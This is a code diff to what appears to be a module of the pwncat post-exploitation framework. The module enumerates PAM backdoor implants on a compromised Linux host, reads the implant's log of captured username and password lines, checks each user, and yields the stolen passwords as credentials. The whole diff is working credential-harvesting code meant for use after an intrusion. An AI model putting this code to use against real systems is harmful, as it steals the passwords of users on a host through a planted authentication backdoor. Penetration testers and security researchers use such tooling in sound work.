@@ -28,43 +28,36 @@ class Module(EnumerateModule):
 
     def enumerate(self, session):
 
-        pam: InstalledModule = None
-        # Check if we previously had PAM persistence... this isn't re-implemented yet
-        # for module in session.run(
-        #     "persist.gather", progress=self.progress, module="persist.pam_backdoor"
-        # ):
-        #     pam = module
-        #     break
+        # Ensure the user database is already retrieved
+        session.find_user(uid=0)
 
-        if pam is None:
-            # The pam persistence module isn't installed.
-            return
+        for implant in session.run("enumerate", types=["implant.*"]):
+            if implant.source != "linux.implant.pam":
+                continue
 
-        # Grab the log path
-        log_path = pam.persist.args["log"]
-        # Just in case we have multiple of the same password logged
-        observed = []
+            # Just in case we have multiple of the same password logged
+            observed = []
 
-        try:
-            with session.platform.open(log_path, "r") as filp:
-                for line in filp:
-                    line = line.rstrip("\n")
-                    if line in observed:
-                        continue
+            try:
+                with session.platform.open(implant.log, "r") as filp:
+                    for lineno, line in enumerate(filp):
+                        line = line.rstrip("\n")
+                        if line in observed:
+                            continue
 
-                    user, *password = line.split(":")
-                    password = ":".join(password)
+                        user, *password = line.split(":")
+                        password = ":".join(password)
 
-                    try:
-                        # Check for valid user name
-                        session.platform.find_user(name=user)
-                    except KeyError:
-                        continue
+                        try:
+                            # Check for valid user name
+                            user_info = session.find_user(name=user)
+                        except KeyError:
+                            continue
 
-                    observed.append(line)
+                        observed.append(line)
 
-                    yield "creds.password", PotentialPassword(
-                        password, log_path, None, uid=pwncat.victim.users[user].id
-                    )
-        except (FileNotFoundError, PermissionError):
-            pass
+                        yield PotentialPassword(
+                            self.name, password, implant.log, lineno, user_info.id
+                        )
+            except (FileNotFoundError, PermissionError):
+                pass
